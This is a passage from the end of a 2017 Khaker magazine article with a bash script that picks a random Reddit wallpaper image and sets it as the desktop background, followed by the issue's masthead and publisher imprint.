но‐вычислительного брата, на первых порах, чтобы как‐то собраться с мыс‐
лями от избытка обрушившегося свободного времени, ничего не оста ется,
как созерцать обои на рабочем столе своего монитора. В такие минуты
кто‐то решит, что новогодние пейзажи, пережившие лето, смот рятся сов сем
уж неуместно, и тогда начнет лихора дочно прочесы вать фотобанк в поисках
под ходящих картинок.
  К счастью, у нас в запасе остался сценарий, который не только меняет
обои рабоче го сто ла, но и избавляет пользователя от бре мени их поиска
и выбора. Функцию установки обо ев из подборки выпол няет консоль ный feh,
а саму под борку wget со товари щи выуживают из Reddit.


#!/bin/bash
wget ‐O ‐ http://www.reddit.com/r/wallpaper | grep ‐Eo 'http://i.
imgur.com[^&]+jpg' | shuf ‐n 1 | xargs wget ‐O background.jpg
feh ‐‐bg‐fill background.jpg


ВЫВОДЫ
Это лишь несколько при меров того, как мож но исполь зовать консольные инс‐
трументы для взаимо действия с веб‐сервисами. При желании ты можешь их
ком бинировать и переделывать под другие сер висы. Например, исполь‐
зовать скрипт монито ринга сервера в сочета нии с Telegram вместо Twitter
или, наоборот, отправлять алар мы о включении компа в DM твиттера вместо
телег рама. Ну и конечно же, придумать свои собс твенные варианты исполь‐
зования!
                                    18+





  № 8/9 (223)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                       РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru               zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Евгений Зобнин
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                                 Depositphotos.com
                                   Источник лицензионных
                                    фото и графики


                           РЕКЛАМА
                                 Анна Яковлева
                                   Директор по рекламе
                                          yakovleva.a@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                     Подробная информация по подписке: support@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2017